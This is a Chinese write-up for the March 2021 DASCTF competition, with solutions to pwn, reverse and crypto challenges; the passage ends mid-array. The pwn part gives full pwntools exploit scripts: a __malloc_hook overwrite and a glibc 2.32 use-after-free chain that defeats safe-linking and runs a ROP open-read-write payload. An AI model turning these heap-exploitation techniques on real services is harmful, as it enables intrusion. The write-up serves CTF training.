> 原文链接: https://www.anquanke.com//post/id/236183 


# MAR DASCTF题解


                                阅读量   
                                **384260**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0147ec444cc31471b8.jpg)](https://p5.ssl.qhimg.com/t0147ec444cc31471b8.jpg)



> 2021 MAR DASCTF题解，包括一道套路pwn题和一道2.32 uaf的pwn题，两个reverse 和 四道密码学。题目考察知识点比较新，也能够从中学习到一些新知识。

## Pwn

### <a class="reference-link" name="fruitpie"></a>fruitpie

题目的逻辑十分简单

```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  size_t size; // [rsp+4h] [rbp-1Ch]
  char *chunk; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(*(_QWORD *)&amp;argc, argv, envp);
  welcome();
  puts("Enter the size to malloc:");
  LODWORD(size) = readInt("Enter the size to malloc:");
  chunk = (char *)malloc((unsigned int)size);
  if ( !chunk )
  `{`
    puts("Malloc Error");
    exit(0);
  `}`
  printf("%p\n", chunk);
  puts("Offset:");
  _isoc99_scanf("%llx", (char *)&amp;size + 4);
  puts("Data:");
  read(0, &amp;chunk[*(size_t *)((char *)&amp;size + 4)], 0x10uLL);
  malloc(0xA0uLL);
  close(1);
  return 0;
`}`
```

我们可以申请任意大小的一个堆块并得到它的地址，然后往堆块附近写入一个值，之后程序会申请一个0xa0的堆块，最后关闭了标准输出流并返回

那么我们可以申请一个特别大的堆块，这样这个堆块就会靠近libc，我们便可以计算得到libc及地址，进而我们可以向malloc_hook中写入one_gadget，最后通过错误流进行输出

```
from pwn import *
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./fruitpie")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com",51202)
libc = ELF("./libc.so.6")
#gdb.attach(r)

r.recvuntil("Enter the size to malloc:")
r.sendline(str(0x200000))
r.recvuntil("0x")
chunk_addr = int(r.recvuntil("\n",drop = True),16)
libc_base = chunk_addr + 0x200ff0
success("libc_base : " + hex(libc_base))
malloc_hook = libc_base + libc.sym["__malloc_hook"]
success("malloc_hook : " + hex(malloc_hook))
one_gadget = libc_base + 0x10a45c

offset = hex(malloc_hook - chunk_addr)[2:]
r.recvuntil("Offset:")
r.sendline(str(offset))
r.recvuntil("Data:")
r.send(p64(one_gadget))

r.interactive()
# cat flag &gt;&amp;2
```

### <a class="reference-link" name="clown"></a>clown

程序的主要逻辑如下

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
`{`
  unsigned int v3; // eax

  sub_D7A();
  sub_D07();
  while ( 1 )
  `{`
    while ( 1 )
    `{`
      menu();
      v3 = get_opt(a1, a2);
      if ( v3 != 2 )
        break;
      Del();
    `}`
    if ( v3 &gt; 2 )
    `{`
      if ( v3 == 3 )
      `{`
        Show();
      `}`
      else
      `{`
        if ( v3 == 4 )
        `{`
          puts("Bye~");
          exit(0);
        `}`
LABEL_13:
        a1 = (__int64)"Invalid Choice";
        puts("Invalid Choice");
      `}`
    `}`
    else
    `{`
      if ( v3 != 1 )
        goto LABEL_13;
      Add();
    `}`
  `}`
`}`
```

程序总体功能是一个比较常见的菜单题，实现了`Add\Delete\Show`功能。其中能申请的堆块数量为`0x100`，也就导致这道题方法还挺灵活的。并且开启了沙箱，那么我们就只能使用 `orw`来获取 `flag`

```
int sub_BD5()
`{`
  int result; // eax
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  puts("Index: ");
  v1 = get_opt();
  if ( v1 &lt;= 0xFF &amp;&amp; *((_QWORD *)&amp;chunk_list + v1) )
  `{`
    free(*((void **)&amp;chunk_list + v1));
    result = puts("Done");
  `}`
  else
  `{`
    puts("Error");
    result = 1;
  `}`
  return result;
`}`
```

程序漏洞存在于 `delete`函数中，有一个 `UAF`漏洞。`libc`版本为`2.32`

首先我们需要泄漏地址。由于有一个 `UAF`漏洞，那么泄露地址就十分简单。可以直接申请 大于`0x80`的堆块填充满`tcache`后，再释放一个到 `unsortedbin`来泄露地址。以此得到`libc`地址

此外，我们还需要知道堆地址，原因是由于`glibc-2.32`新增了一种`safe-linking`机制，该机制用于对单链表`tcache`以及`fastbin`的`fd`指针进行加密，从而增强安全性，加密的规则为将`fd`指针与右移3个字节的堆基地址进行异或操作

```
#define PROTECT_PTR(pos, ptr) \  
  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))  
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
```

所以，如果后面想通过劫持`tcache`实现任意地址堆块分配，需要知道堆地址，来对我们任意地址进行加密。

这里想要泄露`heap`地址，可以输出`tcache`中的第一个堆块，由于该堆块的`next`指针指向 `tcache_perthread_struct`结构体，所以加密后也就是 `tcache_perthread_struct&gt;&gt;12`，我们很容易得到堆块地址

之后便是劫持`tcache`，劫持`tcache`的最好思路是利用`uaf`漏洞将`tcache`中的空闲堆块的`next`指针改为我们想分配的地址。但是这里没有 `edit`功能。所以选择利用堆合并后，申请大堆块，来实现堆重叠。

先分别释放`0x90 chunk1`和 `0xf0 chunk2`的堆块到`unsortedbin`中造成堆合并，然后再将 `chunk2`放入`tcache`中 。然后申请一个`0x100 chunk3`的堆块，此时`chunk3`就和 `chunk2`发生重叠。利用`chunk3`修改`chunk2`的`next`指针指向`free_hook`

最后便是`orw`，`glibc-2.32`的`orw`，不能仅仅使用`setcontext`，因为此时 `setcontext+61`的参数变为了`rdx`。所以需要找到一个将 `rdi`赋值给`rdx`的`gadget`。我使用如下：

```
0x0000000000124990: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```

我们只需要再 `rdi+8`处布置`rdi`的值，在`rdx+0x20`处布置 `setcontext+61`的地址，即可实现顺利调用 `setcontext+61`。

后续就是执行 orw来读取 flag

```
from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')
context.terminal=(['tmux','split','-h'])
filename = './clown'
libcname = '/lib/x86_64-linux-gnu/libc.so.6'
debug = 0
if debug == 1:
    #p = process([filename], env=`{`"LD_PRELOAD": "./libc-2.31.so"`}`)
    p = process(filename)
    elf = ELF(filename)
    libc = ELF(libcname)
    #libc = ELF('./libc-2.31.so')
else:
    p = remote('pwn.machine.dasctf.com', 50801)
    libc = ELF('./libc.so.6')
    elf = ELF(filename)

def Add(size, payload):
    p.sendlineafter('&gt;&gt; ', str(1))
    p.sendlineafter('Size: \n',str(size))
    p.sendafter('Content: ', payload)

def Delete(idx):
    p.sendlineafter('&gt;&gt; ', str(2))
    p.sendlineafter('Index: \n',str(idx))

def Show(idx):
    p.sendlineafter('&gt;&gt; ', str(3))
    p.sendlineafter('Index: \n',str(idx))

def magic_frame(rdx_rdi, secontext_addr, rdi, rsi, rdx, rsp, rip):
    payload = p64(rdx_rdi) + p64(0) * 2  #rdx
    payload += p64(secontext_addr)             #call func_addr
    payload = payload.ljust(0x60, b'\x00')
    payload += p64(rdi) + p64(rsi)  # rdi , rsi
    payload += p64(0) * 2 + p64(rdx) + p64(0x18) + p64(0)  # rdx
    payload += p64(rsp) + p64(rip)  # rsp, rip
    payload = payload.ljust(0xf8, b'\x00')
    return payload

def enc(addr1, addr2):
    addr = (addr1&gt;&gt;12)^addr2
    return addr

def Pwn():
    for i in range(8):
        Add(0x90, 'a'*8)

    Add(0xf0, 'a'*8)    #8
    Add(0xa0, 'a'*8)    #9
    #Add(0xf0, 'a'*8)

    for i in range(7):
        Add(0xf0, 'a'*8)    #10-16

    Delete(0)
    Show(0)
    heap_addr = (u64(p.recv(5).ljust(8, b'\x00'))&lt;&lt;12)
    print('heap_addr:',hex(heap_addr))

    for i in range(1, 8):
        Delete(i)

    Add(0x100, 'a'*8)    #17

    Show(7)
    libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x10-240-libc.sym['__malloc_hook']
    print('libc_addr:',hex(libc_addr))
    free_hook = libc_addr+libc.sym['__free_hook']
    system = libc_addr+libc.sym['system']
    print("free_hook:",hex(free_hook))

    print('chunk consolidate:')
    for i in range(7):
        Delete(10+i)
    Delete(8)

    for i in range(7):  #18-24
        Add(0xf0, 'a'*8)

    print("double free")
    Delete(20)
    Delete(8)

    #gdb.attach(p, 'bp $rebase(0xf32)')
    print("hajack free_hook")
    a1 = enc(heap_addr+0x7a0, free_hook)
    print("addr:",hex(a1))
    payload = 'a'*0x90+p64(0)+p64(0x91)+p64(a1)
    Add(0x100, payload)  #25
    Add(0xf0, 'a'*8)   #26

    for i in range(8):
        Add(0x80, '2'*8)    #27-34

    for i in range(8):      #35-42
        Add(0xe0, '3'*8)

    for i in range(8):
        Delete(27+i)
    for i in range(7):
        Delete(36+i)

    print("chunk consolidate 2")
    Delete(35)

    for i in range(7):  #43-49
        Add(0xe0, '2'*8)
    print("tcahe hajack2")
    Delete(45)
    Delete(35)

    #gdb.attach(p, 'bp $rebase(0xf32)')
    a1 = enc(heap_addr+0x1550, free_hook+0xe0)
    print("addr:",hex(a1))
    payload = 'a'*0x80+p64(0)+p64(0xf1)+p64(a1)
    Add(0x100, payload)  #50
    Add(0xe0, 'a'*8)   #51

    for i in range(8):  #52-59
        Add(0xb0, '2'*8)
    for i in range(8):  #60-67
        Add(0xd0, '3'*8)
    for i in range(8):
        Delete(52+i)
    for i in range(7):
        Delete(61+i)
    print("chunk consolidate 3")
    Delete(60)

    for i in range(7):  #68-74
        Add(0xd0, '2'*8)
    print("tcahe hajack3")
    Delete(70)
    Delete(60)

    #gdb.attach(p, 'bp $rebase(0xf32)')
    a1 = enc(heap_addr+0x22d0, free_hook+0x1c0)
    print("addr:",hex(a1))
    payload = 'a'*0xb0+p64(0)+p64(0xf1)+p64(a1)
    Add(0x100, payload)  #75
    Add(0xd0, 'a'*8)   #76

    p_rdi_r = 0x277d6+libc_addr
    p_rsi_r = 0x32032 + libc_addr
    p_rdx_r = 0xc800d + libc_addr
    p_rax_r = 0x45580 + libc_addr
    syscall = 0x611ea+libc_addr
    ret = 0xbcc1b + libc_addr

    flag_str_addr = free_hook + 0x210
    flag_addr = free_hook + 0x300
    open_addr = libc_addr+libc.sym['open']
    read_addr = libc_addr + libc.sym['read']
    write_addr = libc_addr+libc.sym['write']
    orw = flat([
        p_rdi_r, flag_str_addr,
        p_rsi_r, 0,
        open_addr,
        p_rdi_r, 3,
        p_rsi_r, flag_addr,
        p_rdx_r, 0x40,
        read_addr,
        p_rdi_r, 1,
        p_rsi_r, flag_addr,
        p_rdx_r, 0x40, 0,
        write_addr
    ])

    setcontext = libc_addr + libc.sym['setcontext']
    magic_addr = libc_addr + 0x14b760
    orw_addr = free_hook+0x110
    frame_addr = free_hook
    payload = p64(magic_addr)
    payload += magic_frame(frame_addr, setcontext + 61, 0, 0, 0, orw_addr, ret)
    payload = payload.ljust(0x110, b'\x00') + orw
    payload = payload.ljust(0x220, b'\x00') + './flag\x00'

    print('magic:',hex(magic_addr))

    p1 = payload[:0xe0]
    p2 = payload[0xe0:0x1d0]
    p3 = payload[0x1d0:]
    #gdb.attach(p, 'bp $rebase(0xf32)')
    Add(0xd0, p3)
    Add(0xe0, p2)
    Add(0xf0, p1)

    Delete(79)

    p.interactive()

Pwn()
```



## Reverse

### <a class="reference-link" name="drinkSomeTea"></a>drinkSomeTea

题目给了一个exe文件和加密过的png图片，ida打开可以发现是一个文件加密的程序，其中有一个花指令

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b7152c6248ffd893.png)

手动修一下后还原成`function`即可发现这是一个`tea`加密，这里需要注意的是`output0`和`output1`和普通的`tea`不同，是`int`而非`unsigned int`，所以用平常的`tea`脚本得出的结果会不一样

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01810d3e0bbdb6250e.png)

`tea`的`key`就是`flag`{`fake_flag!`}``，那么我们编写对应的脚本进行解密

```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;

void decrypt(int *A,unsigned int *B)`{`
    int v0 = A[0],v1 = A[1];
  unsigned int sum = 0xC6EF3720,delta = 0x9E3779B9;
    for(int i = 0; i &lt; 32; i++)`{`
        v1 -= ((v0 &lt;&lt; 4) + B[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + B[3]);
                v0 -= ((v1 &lt;&lt; 4) + B[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + B[1]);
        sum -= delta;
    `}`
    A[0] = v0;
    A[1] = v1;
`}`

int main()`{`
    unsigned int key[4] = `{`0x67616c66,0x6b61667b,0x6c665f65,0x7d216761`}`;
    FILE *op = NULL;
    op = fopen("./tea.png", "w+");
    int fp = -1;
    fp = open("./tea.png.out", O_RDONLY);
    unsigned char buff[9];
    for(int round = 0; round &lt; 7328; round++)`{`
        read(fp,buff,8);
        int A[2];
        for(int i = 0; i &lt; 2; i++)`{`
            unsigned int tmp = 0;
            for(int j = 0; j &lt; 4; j++)`{`
                tmp &lt;&lt;= 8;
                tmp |= buff[i * 4 + 3 - j];
            `}`
            A[i] = tmp;
        `}`
        for(int i=0; i&lt;2; i++)`{`
            printf("%X ",A[i]);
        `}`
        decrypt(A,key);
        unsigned int output[8] = `{`0,0,0,0,0,0,0,0`}`;
        for(int i = 0; i &lt; 2; i++)`{`
            int tmp = A[1 - i];
            for(int j = 0; j &lt; 4; j++)`{`
                output[(1 - i) * 4 + j] = tmp &amp; 0xff;
                tmp &gt;&gt;= 8;
            `}`
        `}`
        for(int i = 0; i &lt; 8; i++)`{`
            fprintf(op,"%02x",output[i]);
        `}`
    `}`
    fclose(op);
    close(fp);
`}`
```

```
data = open("tea.png","rb").read()
data = bytes.fromhex(data.decode("utf-8"))
with open("flag.png","wb") as f:
    f.write(data)
```

即可还原出原来的图片

[![](https://p0.ssl.qhimg.com/t012d919f7fdf105c05.png)](https://p0.ssl.qhimg.com/t012d919f7fdf105c05.png)

### <a class="reference-link" name="Enjoyit-1"></a>Enjoyit-1

题目是一个`.net`程序，用`dnSpy`打开，可以发现首先进行了一个类似`base64`的操作

[![](https://p5.ssl.qhimg.com/t01824b9cfaea0f134b.png)](https://p5.ssl.qhimg.com/t01824b9cfaea0f134b.png)

跟进去之后发现就是base64，但是码表进行了替换

[![](https://p0.ssl.qhimg.com/t01a9fd9a5e9bc091c7.png)](https://p0.ssl.qhimg.com/t01a9fd9a5e9bc091c7.png)

那么我们去`github`上找一个`base64`的脚本改一改来进行解密

```
class b64:

    def __init__(self):
        self.table = 'abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ='

    def __str__(self):
        return 'Base64 Encoder / Decoder'

    def encode(self, text):
        bins = str()
        for c in text:
            bins += '`{`:0&gt;8`}`'.format(str(bin(ord(c)))[2:])
        while len(bins) % 3:
            bins += '00000000'
        d = 1
        for i in range(6, len(bins) + int(len(bins) / 6), 7):
            bins = bins[:i] + ' ' + bins[i:]
        bins = bins.split(' ')
        if '' in bins:
            bins.remove('')
        base64 = str()
        for b in bins:
            if b == '000000':
                base64 += '='
            else:
                base64 += self.table[int(b, 2)]
        return base64

    def decode(self, text):
        bins = str()
        for c in text:
            if c == '=':
                bins += '000000'
            else:
                bins += '`{`:0&gt;6`}`'.format(str(bin(self.table.index(c)))[2:])
        for i in range(8, len(bins) + int(len(bins) / 8), 9):
            bins = bins[:i] + ' ' + bins[i:]
        bins = bins.split(' ')
        if '' in bins:
            bins.remove('')
        text = str()
        for b in bins:
            if not b == '00000000':
                text += chr(int(b, 2))
        return text

    def test(self):
        e = 'Running Class Test'
        d = 'UnVubmluZyBDbGFzcyBUZXN0'        
        if e == decode(d) and d == encode(e):
            return True
        else:
            return False


_inst = b64()
encode = _inst.encode
decode = _inst.decode

if __name__ == '__main__':
    s = "yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC="
    print(decode(s))
```

可以得到`combustible_oolong_tea_plz`<br>
之后程序进行了一个`xtea`和`xor`的操作

[![](https://p3.ssl.qhimg.com/t0168a63ad0012712d4.png)](https://p3.ssl.qhimg.com/t0168a63ad0012712d4.png)

[![](https://p3.ssl.qhimg.com/t01a716a61012743d32.png)](https://p3.ssl.qhimg.com/t01a716a61012743d32.png)

那么我们按照这个逻辑解密即可得到flag

```
from Crypto.Util.number import *

enc = [2,5,4,13,3,84,11,4,87,3,86,3,80,7,83,3,0,4,83,94,7,84,4,0,1,83,3,84,6,83,5,80]

def decrypt(A,B):
    delta = 2654435464
    v0 = A[0]
    v1 = A[1]
    s = 0
    for i in range(32):
        v0 += (v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1 ^ s + B[s &amp; 3]
        v0 &amp;= 0xffffffff
        s += delta
        s &amp;= 0xffffffff
        v1 += (v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0 ^ s + B[(s &gt;&gt; 11) &amp; 3]
        v1 &amp;= 0xffffffff
    return [v0,v1]

A = [288,369]
B = b"combustible_oolong_tea_plz"
B = [i for i in B]
[v0,v1] = decrypt(A,B)
v0 = long_to_bytes(v0)
v1 = long_to_bytes(v1)
key = (v0 + v1).hex()
key = [ord(i) for i in key]
flag = ""
for i in range(len(enc)):
    flag += chr(key[i % len(key)] ^ enc[i])
print(flag)
```



## Crypto

### <a class="reference-link" name="crypto_threshold"></a>crypto_threshold

题目代码如下

```
import random
from sympy import nextprime
from Crypto.Util.number import *
from secret import flag
from gmpy2 import gcd

def lcg(seed,params):
    (m,c,n)=params
    s = seed % n
    while True:
        s = (m * s + c) % n
        yield s


seed = getPrime(128)
m = getPrime(128)
c = getPrime(128)
n = getPrime(129)

print(m,c,n)
key_stream = lcg(seed,(m,c,n))
num=[]
for _ in range(6):
    num.append(next(key_stream))

print(num)
secret =  next(key_stream)

e = nextprime(secret)
p = getPrime(1024)
q = getPrime(1024)


_lambda = ((p-1)*(q-1)) / gcd(p-1,q-1)

flag = bytes_to_long(flag)


print(_lambda)
print(p*q)
print(pow(flag,e,p*q))
```

`flag`被`rsa`加密，`e`是由`lcg`生成的，由于我们知道`lcg`的之前的状态，所以可以很容易推出`e`的值

然后我们知道`lcm(n)`，通过比较`n`和`lcm(n)`的比特数可以很容易发现它们相差的很小，那么可以通过爆破`gcd(p-1,q-1)`的方式来分解`n`进而解密得到`flag`

```
from sympy import nextprime
from Crypto.Util.number import *
import gmpy2

def lcg(seed,params):
    (m,c,n) = params
    s = seed % n
    while True:
        s = (m * s + c) % n
        yield s

a = 315926151576125492949520250047736865439
b = 204423972944032372640132172728460755543
n = 375402477603617093440157245062608289367

lcg_output = [345100389799760820174075838471701328893, 354616152072197410104284828964580660629, 262223452907927780613453340112396026524, 36884243358932605284421044617284274488, 293840768243490066897038832083154668562, 287868671713011127830359814204794790287]
l = lcg(lcg_output[-1],(a,b,n))
secret = next(l)
e = nextprime(secret)
_lambda = 457872764421730558978217109311884057410311335293040789670930865953404030084212226269947268155086034859079522508205099945996505165612539895857134158846470122889806235716457030336629794120415334028017836171608283093853784030348654118118278878881245838363354935523654666907698225985634469947076411404657018958617661794208646954882326918608011132295868155254980231015984288966599987516188265570396237695988003707515471895679008794498548940902202079105268931791776841539932961070351617834137017590635300615537152347169984974533340989459692132455611998382465644967355506104871655788359202461542101480022365857889833055840
n = 27472365865303833538693026558713043444618680117582447380255851957204241805052733576196836089305162091544771350492305996759790309936752393751428049530788207373388374142987421820197787647224920041681070170296496985631227041820919247087096732732874750301801296131419280014461893559138068196824584684279421137517391204355597563871480257589096606865035259322614687417246708249170470689983675108996118328359454354818425772935513344465778617739729440207409124134831968562495435786944862849412776010947330752600405451073822977981611026975129395818269513358936682934286140359273764118787152676411486767003233858544159511154941
c = 7187920142528335824861143203876908084067528690298329755497671248322277194754277305701102880967402859593937177306927235921616059382304183094350022713118203435560220591865274025991334717202171313133285253575822615616032441398946742994706880814251670668924098240782583026655923033371628284132606950034409888896558825512875084001031123558055489119898334591442547695833103046341283479780998109787754685881665949269402489768629140076361688313079919123642491566639820702501701460474001196941883819620040361365999896847153131825439764785309224799365130821807533936571946283436139142085798584001786665762720472918598961576836

g = 2
for i in range(2**7):
    phi = _lambda * g
    d = gmpy2.invert(e,phi)
    m = pow(c,d,n)
    flag = long_to_bytes(m)
    if b"CTF" in flag:
        print(flag)
        exit(0)
    g = nextprime(g)
```

### <a class="reference-link" name="threshold"></a>threshold

题目代码如下

```
#make.sage
import random
flag = bytearray("DASCTF`{`********************************`}`".encode())
flag = list(flag)
length = len(flag)
N=53
p=257
q=28019
d=18
f=[1]*19+[-1]*18+[0]*16
random.shuffle(f)
g=[1]*18+[-1]*18+[0]*17
random.shuffle(g)

Q.&lt;x&gt; = Zmod(q)[]
P.&lt;y&gt; = Zmod(p)[]
fx=Q(f)
fy=P(f)
gx=Q(g)

Fqx=fx.inverse_mod(x^N-1)
Fpy=fy.inverse_mod(y^N-1)
hx=(Fqx*gx).mod(x^N-1)
r=[1]*10+[-1]*22+[0]*21
random.shuffle(r)
rx=Q(r)
mx=Q(flag)
ex=(p*rx*hx+mx).mod(x^N-1)
print(ex)
print(hx)
```

可以发现本题的内容和[2020SCTF-Lattice](https://ctftime.org/writeup/22161)很像，那么我们可以据此写出`exp`，不过由于这道题中没有`bal_mod`，所以也就可以去掉

```
import random
p = 257
q = 28019
n = 53
Zx.&lt;x&gt; = ZZ[]

e = 7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860
h = 14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 6022

def inv_mod_prime(f,p):
    T = Zx.change_ring(Integers(p)).quotient(x^n-1)
    return Zx(lift(1 / T(f)))

def mul(f,g):
    return (f * g) % (x^n-1)

def bal_mod(f,q):
    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))
    return Zx(g)

def decrypt(e,pri_key):
    f,fp = pri_key
    a = bal_mod(mul(e,f),q)
    d = bal_mod(mul(a,fp),p)
    return d

def get_key():
    for j in range(2 * n):
        try:
            f = Zx(list(M[j][:n]))
            fp = inv_mod_prime(f,p)
            return (f,fp)
        except:
            pass
    return (f,f)

M = matrix(ZZ, 2*n, 2*n)
hh = h.list()
for i in range(n): M[i,i] = 1
for i in range(n,2*n): M[i,i] = q
for i in range(n):
    for j in range(n):
        M[i,j+n] = hh[(n-i+j) % n]
M = M.LLL()
key = get_key()

l = decrypt(e, key).list()
flag = bytes(l)
print(flag)
```

### <a class="reference-link" name="son_of_NTRU"></a>son_of_NTRU

虽然这道题目说的不是`NTRU`，但是我们还是可以发现题目的代码和`NTRU`基本类似

```
#! /bin/bash/env python3
from random import randrange
from Crypto.Util.number import *
from gmpy2 import invert
def gcd(a,b):
    while b:
        a,b = b,a%b
    return a

def generate():
    p = getPrime(1024)
    while True:
        f = randrange(1,(p//2)**(0.5))
        g = randrange((p//4)**(0.5),(p//2)**(0.5))
        if gcd(f,p)==1 and gcd(f,g)==1:
            break
    h = (invert(f,p)*g)%p
    return h,p,f,g

def encrypt(m,h,p):
    assert m&lt;(p//4)**(0.5)
    r = randrange(1,(p//2)**(0.5))
    c = (r*h+m)%p
    return c

h,p,f,g = generate()

from flag import flag
c = encrypt(bytes_to_long(flag),h,p)
print("h = `{``}`".format(h))
print("p = `{``}`".format(p))
print("c = `{``}`".format(c))
```

那么我们可以直接使用[Soreat_u](https://xz.aliyun.com/t/7163#toc-5)师傅的脚本进行解密

```
from Crypto.Util.number import *
def GaussLatticeReduction(v1, v2):
    while True:
        if v2.norm() &lt; v1.norm():
            v1, v2 = v2, v1
        m = round( v1*v2 / v1.norm()^2 )
        if m == 0:
            return (v1, v2)
        v2 = v2 - m*v1

h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004
p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469
c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700

# Construct lattice.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);

# Solve SVP.
shortest_vector = m.LLL()[0]
# shortest_vector = GaussLatticeReduction(v1, v2)[0]
f, g = shortest_vector
print(f, g)
f = abs(f)
g = abs(g)
# Decrypt.
a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(long_to_bytes(m))
```

### <a class="reference-link" name="FeedBack"></a>FeedBack

题目代码如下

```
from secret import flag
from string import hexdigits
import random
from functools import reduce

def cycle(c:list,a:list)-&gt;int:
    return reduce(lambda x,y: x+y,map(lambda x: x[0]*x[1],zip(c,a))) 

def enc(m:list,k:list)-&gt;list:
    for i in range(len(k)*2):
        m.append(cycle(m[i:i+len(k)],k))
    return m[len(k):]

if __name__ == "__main__":
    key=[ord(random.choice(hexdigits)) for i in range(len(flag))]
    c=enc(list(flag),key)
    print(c)
```

可以发现题目的代码逻辑十分像[LFSR](https://ctf-wiki.org/crypto/streamcipher/fsr/lfsr/)，不同的地方是这里的`key`是`hexdigits`的数而非`01`

那么我们可以参考[2019De1CTF-Babylfsr](https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/crypto/Babylfsr)，首先得到如下的关系（假设`n = len(m) // 2`）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01deff7ca4df1dcf0b.png)

那么我们便可以通过`m`得到`key`，之后再一个一个字节逆推回去即可还原`flag`

```
c = [180320, 12795604, 913707946, 65244867544, 4658921499366, 332678259897680, 23755460291939729, 1696299282824525162, 121127152307279309992, 8649291534003765460181, 617617459134250473857819, 44102031285199767595231826, 3149180993372727865351695610, 224872656429052251931507068163, 16057416742916791898621189838002, 1146607313446549338631740275859490, 81875456824588820793005728503088789, 5846457066530480582594997088868317921, 417476268914312098171907310476576578536, 29810607197367740257089118506396936455267, 2128677406710643996313598469435818995764283, 152001851952900202233154866795341968398324618, 10853952282423997785255606215412380976089774602, 775045031593704366379150517314704054142878227755, 55343416422679709865626814221707233611767499083451, 3951891330799176591085237005754672086216649002044116, 282191561344334793283891774610663595748300192924237652, 20150371209182455377207293308509352961052348504530516058, 1438871729308714548579613052036192683042976990785336035213, 102745097443187470470063857372230471012050786200205019335560, 7336689458539737357933680339939811164938123954552946412371136, 523888862345101730958585832445722009143686030486587614405269619, 37409180481229224476184683624742923927721083153229315469794323846, 